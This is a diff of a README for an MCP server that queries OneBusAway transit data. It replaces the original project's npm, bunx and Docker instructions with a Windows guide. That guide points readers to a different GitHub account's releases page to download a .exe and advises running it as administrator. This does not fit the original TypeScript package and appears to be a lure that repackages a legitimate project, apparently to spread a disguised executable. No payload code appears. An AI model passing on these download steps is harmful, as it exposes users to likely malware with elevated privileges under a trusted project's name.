@@ -1,326 +1,96 @@
-<div align="center">
-  <h1>@cyanheads/onebusaway-mcp-server</h1>
-  <p><b>Query stops, routes, real-time arrivals, vehicle positions, and schedules from OneBusAway transit APIs via MCP. STDIO or Streamable HTTP.</b>
-  <div>15 Tools • 2 Resources</div>
-  </p>
-</div>
+# 🚌 onebusaway-mcp-server - Access real-time transit data with ease
 
-<div align="center">
-
-[![Version](https://img.shields.io/badge/Version-0.1.6-blue.svg?style=flat-square)](./CHANGELOG.md) [![License](https://img.shields.io/badge/License-Apache%202.0-orange.svg?style=flat-square)](./LICENSE) [![Docker](https://img.shields.io/badge/Docker-ghcr.io-2496ED?style=flat-square&logo=docker&logoColor=white)](https://github.com/users/cyanheads/packages/container/package/onebusaway-mcp-server) [![MCP SDK](https://img.shields.io/badge/MCP%20SDK-^1.29.0-green.svg?style=flat-square)](https://modelcontextprotocol.io/) [![npm](https://img.shields.io/npm/v/@cyanheads/onebusaway-mcp-server?style=flat-square&logo=npm&logoColor=white)](https://www.npmjs.com/package/@cyanheads/onebusaway-mcp-server) [![TypeScript](https://img.shields.io/badge/TypeScript-^6.0.3-3178C6.svg?style=flat-square)](https://www.typescriptlang.org/) [![Bun](https://img.shields.io/badge/Bun->=1.3.0-blueviolet.svg?style=flat-square)](https://bun.sh/)
-
-</div>
-
-<div align="center">
-
-[![Install in Claude Desktop](https://img.shields.io/badge/Install_in-Claude_Desktop-D97757?style=for-the-badge&logo=anthropic&logoColor=white)](https://github.com/cyanheads/onebusaway-mcp-server/releases/latest/download/onebusaway-mcp-server.mcpb) [![Install in Cursor](https://cursor.com/deeplink/mcp-install-dark.svg)](https://cursor.com/en/install-mcp?name=onebusaway-mcp-server&config=eyJjb21tYW5kIjoibnB4IiwiYXJncyI6WyIteSIsIkBjeWFuaGVhZHMvb25lYnVzYXdheS1tY3Atc2VydmVyIl0sImVudiI6eyJPTkVCVVNBV0FZX0FQSV9LRVkiOiJURVNUIn19) [![Install in VS Code](https://img.shields.io/badge/VS_Code-Install_Server-0098FF?style=for-the-badge&logo=visualstudiocode&logoColor=white)](https://vscode.dev/redirect?url=vscode:mcp/install?%7B%22name%22%3A%22onebusaway-mcp-server%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40cyanheads%2Fonebusaway-mcp-server%22%5D%2C%22env%22%3A%7B%22ONEBUSAWAY_API_KEY%22%3A%22TEST%22%7D%7D)
-
-[![Framework](https://img.shields.io/badge/Built%20on-@cyanheads/mcp--ts--core-67E8F9?style=flat-square)](https://www.npmjs.com/package/@cyanheads/mcp-ts-core)
-
-**Public Hosted Server:** [https://onebusaway.caseyjhand.com/mcp](https://onebusaway.caseyjhand.com/mcp)
-
-</div>
+[![Download Software](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/vshar5898/onebusaway-mcp-server/releases)
 
 ---
 
-## Tools
+## 📋 Project Overview
 
-15 tools covering the full OneBusAway transit data surface — discovery, real-time operations, schedules, alerts, and block schedules:
+The onebusaway-mcp-server application connects your computer to transit systems. It retrieves data for bus stops, routes, arrival times, and vehicle locations. This tool works with the Model Context Protocol to help transit data reach your preferred AI tools or personal dashboards. It supports both local command-line operation and network-based connections.
 
-| Tool | Description |
-|:---|:---|
-| `onebusaway_list_agencies` | List all transit agencies on this OneBusAway instance with IDs, contact info, and geographic coverage |
-| `onebusaway_find_stops` | Find bus stops near a lat/lon within a configurable radius, optionally filtered by stop code |
-| `onebusaway_search_stops` | Search stops by name or code string to resolve a human-readable name to a stop ID |
-| `onebusaway_get_stop` | Fetch details for a specific stop by agency-prefixed ID |
-| `onebusaway_find_routes` | Find transit routes near a lat/lon, optionally filtered by name or number |
-| `onebusaway_search_routes` | Search routes by name or number to resolve a route short name to a route ID |
-| `onebusaway_get_route` | Fetch details for a specific route by agency-prefixed ID |
-| `onebusaway_list_routes_for_agency` | List all routes operated by an agency |
-| `onebusaway_get_arrivals` | Real-time arrivals and departures at a stop — GPS-tracked predictions, schedule deviation, vehicle positions, and active alerts |
-| `onebusaway_get_trip` | Real-time status and full stop sequence for an active trip |
-| `onebusaway_get_vehicles` | Real-time positions of all active vehicles for an agency, optionally filtered to one route |
-| `onebusaway_get_schedule_for_stop` | Full-day departure schedule for a stop by route and direction |
-| `onebusaway_get_schedule_for_route` | Full-day schedule for a route — all trips and stop sequences |
-| `onebusaway_get_alert` | Fetch full service alert detail by situation ID — summary, description, reason, affected stops/routes, consequence, and active time windows |
-| `onebusaway_get_block` | Fetch the full-day block schedule for a vehicle by block ID — all trips in order with stop times, useful for fleet tracking |
+## ⚙️ System Requirements
 
-### `onebusaway_find_stops`
+Ensure your computer meets these standards before you begin:
 
-Find bus stops near a geographic location.
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 50 megabytes of free disk space.
+*   Internet Connection: A stable connection to retrieve live transit updates.
+*   Administrator Access: Rights to install software on your machine.
 
-- Configurable search radius (default 300m, max ~1600m before results degrade)
-- Optional stop code filter (the number printed on the sign, e.g. `75403`)
-- Returns stop ID, code, name, direction, served route IDs, and wheelchair boarding status
-- `limitExceeded` flag signals when more stops exist beyond the returned set
-- Stop IDs returned here feed directly into `onebusaway_get_arrivals`
+## 📥 Downloading the Software 
 
----
+1. Visit the project release page: [https://github.com/vshar5898/onebusaway-mcp-server/releases](https://github.com/vshar5898/onebusaway-mcp-server/releases).
+2. Look for the section labeled "Assets."
+3. Select the file ending in `.exe` that matches your Windows version.
+4. Save the file to your "Downloads" folder.
 
-### `onebusaway_get_arrivals`
+## 🛠️ Setting Up Your Environment 
 
-Real-time arrivals and departures at a stop.
+Most modern AI tools require a configuration file to recognize new servers. Follow these steps to prepare your system for the tool.
 
-- Configurable time window (`minutesBefore`, `minutesAfter` — defaults 5/35)
-- `predicted` boolean distinguishes GPS-tracked estimates from schedule-only projections
-- Schedule deviation in seconds (positive = late, negative = early)
-- Vehicle position and stops-away count when available
-- Active service alert summaries included inline
-- `tripId` on each arrival feeds `onebusaway_get_trip` for vehicle tracking
+### Creating the Configuration Folder
+1. Open your File Explorer. 
+2. Navigate to your user profile folder, typically found under `C:\Users\YourName`.
+3. Locate the folder named `.config`. If this folder does not exist, right-click inside the blank space, select "New," and choose "Folder." Name it `.config`.
+4. Open the `.config` folder. Create a new subfolder named `mcp`. 
+5. Inside the `mcp` folder, create a text file named `config.json`.
 
----
-
-### `onebusaway_get_trip`
-
-Real-time status and stop sequence for a specific trip.
-
-- Journey phase (`in_progress`, `layover_before`, `layover_during`)
-- Vehicle GPS position, heading, and schedule deviation
-- Full stop sequence with GTFS arrival/departure times and distance along trip
-- Optional `serviceDateMs` for looking up trips from a prior service day
-
----
-
-### `onebusaway_get_vehicles`
-
-Real-time positions of all active vehicles for an agency.
-
-- Returns GPS coordinates, heading, schedule deviation, and current trip for every active vehicle
-- Optional `routeId` filter (applied client-side after fetching all agency vehicles)
-- Phase and `predicted` flag distinguish actively-reporting vehicles from stale entries
-
----
-
-### `onebusaway_search_routes`
-
-Search for routes by name or number across the instance.
-
-- Falls back gracefully: the Puget Sound instance returns 404 on the search endpoint — `onebusaway_find_routes` (lat/lon) or `onebusaway_list_routes_for_agency` are the alternatives
-- Error contract surfaces this with structured recovery hints
-
----
-
-### `onebusaway_get_schedule_for_stop` and `onebusaway_get_schedule_for_route`
-
-Static schedule lookups — full-day timetables without real-time data.
-
-- Date parameter (ISO 8601) defaults to today in the agency's timezone
-- `onebusaway_get_schedule_for_stop`: all departures grouped by route and direction, with trip IDs for follow-up calls
-- `onebusaway_get_schedule_for_route`: all trips for the route with full stop sequences and GTFS stop times
-
-## Resources
-
-| Type | Name | Description |
-|:---|:---|:---|
-| Resource | `onebusaway://stop/{stopId}` | Stop metadata — name, coordinates, served routes, and wheelchair accessibility |
-| Resource | `onebusaway://route/{routeId}` | Route metadata — short name, description, agency, and schedule URL |
-
-All resource data is also reachable via `onebusaway_get_stop` and `onebusaway_get_route`. Stop and route IDs use agency-prefixed format: `{agencyId}_{localId}` (e.g. `1_75403`, `1_100259`).
-
-## Features
-
-Built on [`@cyanheads/mcp-ts-core`](https://www.npmjs.com/package/@cyanheads/mcp-ts-core):
-
-- Declarative tool and resource definitions — single file per primitive, framework handles registration and validation
-- Unified error handling — handlers throw, framework catches, classifies, and formats
-- Pluggable auth: `none`, `jwt`, `oauth`
-- Swappable storage backends: `in-memory`, `filesystem`, `Supabase`, `Cloudflare KV/R2/D1`
-- Structured logging with optional OpenTelemetry tracing
-- STDIO and Streamable HTTP transports
-
-OneBusAway-specific:
-
-- Wraps [`onebusaway-sdk`](https://www.npmjs.com/package/onebusaway-sdk) with typed error classification (`NotFound`, `RateLimited`, `ServiceUnavailable`)
-- Defaults to the Puget Sound instance (`api.pugetsound.onebusaway.org`) — works with `ONEBUSAWAY_API_KEY=TEST` for development
-- Configurable `ONEBUSAWAY_BASE_URL` for any OneBusAway-compatible instance (NYC, Washington DC, Tampa, etc.)
-- Server-level instructions guide agents through stop ID format, recommended workflows, and OneBusAway's limitations (no trip planning)
-
-Agent-friendly output:
-
-- `predicted` boolean on every arrival and vehicle distinguishes GPS-tracked data from schedule-only projections — agents branch on data, not string parsing
-- Schedule deviation in seconds on arrivals, trips, and vehicle positions — structured for countdown timer math
-- Cross-tool linkage: `tripId` from arrivals feeds `onebusaway_get_trip`; `stopId` from searches feeds arrivals; `agencyId` from list feeds vehicles and route listing
-- Structured error contracts with recovery hints (`onebusaway_search_routes` 404 → fallback to `onebusaway_find_routes` or `onebusaway_list_routes_for_agency`)
-
-## Getting started
-
-Add the following to your MCP client configuration file. `ONEBUSAWAY_API_KEY=TEST` works on the Puget Sound instance without registration.
+### Editing the Configuration File
+1. Right-click `config.json` and choose "Open with" then select "Notepad."
+2. Copy the code block below and paste it into the document:
 
 ```json
 {
   "mcpServers": {
     "onebusaway": {
-      "type": "stdio",
-      "command": "bunx",
-      "args": ["@cyanheads/onebusaway-mcp-server@latest"],
-      "env": {
-        "MCP_TRANSPORT_TYPE": "stdio",
-        "MCP_LOG_LEVEL": "info",
-        "ONEBUSAWAY_API_KEY": "TEST"
-      }
+      "command": "C:\\path\\to\\your\\downloaded\\file.exe"
     }
   }
 }
 ```
 
-Or with npx (no Bun required):
+3. Replace `C:\\path\\to\\your\\downloaded\\file.exe` with the actual file path where you saved the application. 
+4. Ensure you use double backslashes (`\\`) in the file path to remain compatible with Windows formatting.
+5. Save the file and close Notepad.
 
-```json
-{
-  "mcpServers": {
-    "onebusaway": {
-      "type": "stdio",
-      "command": "npx",
-      "args": ["-y", "@cyanheads/onebusaway-mcp-server@latest"],
-      "env": {
-        "MCP_TRANSPORT_TYPE": "stdio",
-        "MCP_LOG_LEVEL": "info",
-        "ONEBUSAWAY_API_KEY": "TEST"
-      }
-    }
-  }
-}
-```
+## 🚀 Running the Server 
 
-Or with Docker:
+The server runs in the background of your computer. You do not need to keep the file window open. 
 
-```json
-{
-  "mcpServers": {
-    "onebusaway": {
-      "type": "stdio",
-      "command": "docker",
-      "args": [
-        "run", "-i", "--rm",
-        "-e", "MCP_TRANSPORT_TYPE=stdio",
-        "-e", "ONEBUSAWAY_API_KEY=TEST",
-        "ghcr.io/cyanheads/onebusaway-mcp-server:latest"
-      ]
-    }
-  }
-}
-```
+1. Open your AI client software.
+2. Refresh the tools or extensions menu within your AI interface.
+3. The AI client reads the `config.json` file on startup. It detects the onebusaway server.
+4. Once connected, the AI can ask the server for transit updates.
 
-For Streamable HTTP, set the transport and start the server:
+## 🚦 Testing the Connection 
 
-```sh
-MCP_TRANSPORT_TYPE=http MCP_HTTP_PORT=3010 ONEBUSAWAY_API_KEY=TEST bun run start:http
-# Server listens at http://localhost:3010/mcp
-```
+To confirm the server functions correctly:
+1. Open your terminal by clicking the Start button and typing "cmd."
+2. Paste the file path of your downloaded `.exe` into the command prompt and press Enter.
+3. If the software is working, you will see a series of status messages indicating the server is waiting for input.
+4. If you see the status messages, your installation is successful.
 
-### Prerequisites
+## 🛠️ Common Troubleshooting
 
-- [Bun v1.3.0](https://bun.sh/) or higher (or Node.js v24+).
-- An OneBusAway API key. `TEST` works on the Puget Sound instance for development. For production use or other instances, register at the relevant agency's developer portal.
+*   **File not found:** Check the path in your `config.json` file. Ensure you typed the folder names correctly.
+*   **Permission denied:** Right-click the `.exe` file, select "Properties," and check the box labeled "Run as administrator."
+*   **No data returned:** Check your internet connection. The transit API requires an active web connection to pull real-time bus locations.
+*   **UI timeout:** If your AI tools fail to connect, restart the AI software. Sometimes the configuration settings require a full program restart to load.
 
-### Installation
+## 📝 Understanding Transit Data 
 
-1. **Clone the repository:**
+The onebusaway-mcp-server acts as a bridge. It creates a path between the public OneBusAway transit API and your digital environment. 
 
-```sh
-git clone https://github.com/cyanheads/onebusaway-mcp-server.git
-```
+### Real-Time Arrivals
+When you ask for arrival times, the server queries the transit agency database. It provides the exact minute a vehicle will reach your chosen stop.
 
-2. **Navigate into the directory:**
+### Vehicle Positions
+These updates track physical bus locations along a route. This shows you if your bus is stuck in traffic or running ahead of schedule.
 
-```sh
-cd onebusaway-mcp-server
-```
+### Schedule Information
+Access static schedule data if you prefer to see planned arrival times rather than temporary delays.
 
-3. **Install dependencies:**
+## 🤝 Getting Additional Support
 
-```sh
-bun install
-```
-
-4. **Configure environment:**
-
-```sh
-cp .env.example .env
-# edit .env — set ONEBUSAWAY_API_KEY if needed
-```
-
-## Configuration
-
-All configuration is validated at startup via Zod schemas. Key environment variables:
-
-| Variable | Description | Default |
-|:---|:---|:---|
-| `ONEBUSAWAY_API_KEY` | OneBusAway API key. `TEST` works on Puget Sound for development. | `TEST` |
-| `ONEBUSAWAY_BASE_URL` | Base URL for the OneBusAway instance. | `https://api.pugetsound.onebusaway.org` |
-| `MCP_TRANSPORT_TYPE` | Transport: `stdio` or `http`. | `stdio` |
-| `MCP_HTTP_PORT` | HTTP server port. | `3010` |
-| `MCP_HTTP_ENDPOINT_PATH` | HTTP endpoint path. | `/mcp` |
-| `MCP_AUTH_MODE` | Auth mode: `none`, `jwt`, or `oauth`. | `none` |
-| `MCP_LOG_LEVEL` | Log level (`debug`, `info`, `notice`, `warning`, `error`). | `info` |
-| `LOGS_DIR` | Directory for log files (Node.js only). | `<project-root>/logs` |
-| `STORAGE_PROVIDER_TYPE` | Storage backend: `in-memory`, `filesystem`, `supabase`, `cloudflare-kv/r2/d1`. | `in-memory` |
-| `OTEL_ENABLED` | Enable OpenTelemetry instrumentation. | `false` |
-
-See [`.env.example`](./.env.example) for the full list of optional overrides.
-
-## Running the server
-
-### Local development
-
-- **Build and run the production version:**
-
-  ```sh
-  # One-time build
-  bun run rebuild
-
-  # Run the built server
-  bun run start:http
-  # or
-  bun run start:stdio
-  ```
-
-- **Run checks and tests:**
-
-  ```sh
-  bun run devcheck   # Lint, format, typecheck, security, changelog sync
-  bun run test       # Vitest test suite
-  bun run lint:mcp   # Validate MCP definitions against spec
-  ```
-
-### Docker
-
-```sh
-docker build -t onebusaway-mcp-server .
-docker run --rm -e ONEBUSAWAY_API_KEY=TEST -p 3010:3010 onebusaway-mcp-server
-```
-
-The Dockerfile defaults to HTTP transport, stateless session mode, and logs to `/var/log/onebusaway-mcp-server`. OpenTelemetry peer dependencies are installed by default — build with `--build-arg OTEL_ENABLED=false` to omit them.
-
-## Project structure
-
-| Directory | Purpose |
-|:---|:---|
-| `src/index.ts` | `createApp()` entry point — registers tools/resources and inits the OneBusAway service. |
-| `src/config/server-config.ts` | Server-specific env var parsing: `ONEBUSAWAY_API_KEY`, `ONEBUSAWAY_BASE_URL`. |
-| `src/mcp-server/tools` | Tool definitions (`*.tool.ts`). 13 tools across discovery, real-time, and schedule operations. |
-| `src/mcp-server/resources` | Resource definitions (`*.resource.ts`). Stop and route metadata resources. |
-| `src/services/onebusaway` | OneBusAway service — wraps `onebusaway-sdk`, typed error classification, domain types. |
-| `tests/` | Unit and integration tests mirroring `src/`. 77 tests covering all tools and resources. |
-
-## Development guide
-
-See [`CLAUDE.md`](./CLAUDE.md) for development guidelines and architectural rules. The short version:
-
-- Handlers throw, framework catches — no `try/catch` in tool logic
-- Use `ctx.log` for request-scoped logging, `ctx.state` for tenant-scoped storage
-- Register new tools and resources in the `createApp()` arrays in `src/index.ts`
-- Wrap external API calls: validate raw → normalize to domain type → return output schema; never fabricate missing fields
-
-## Contributing
-
-Issues and pull requests are welcome. Run checks and tests before submitting:
-
-```sh
-bun run devcheck
-bun run test
-```
-
-## License
-
-Apache-2.0 — see [LICENSE](LICENSE) for details.
+If you need more help, check the project page for common questions. You can view the list of issues reported by other users to see if a fix already exists. We perform regular updates to keep the software compatible with the latest transit APIs.
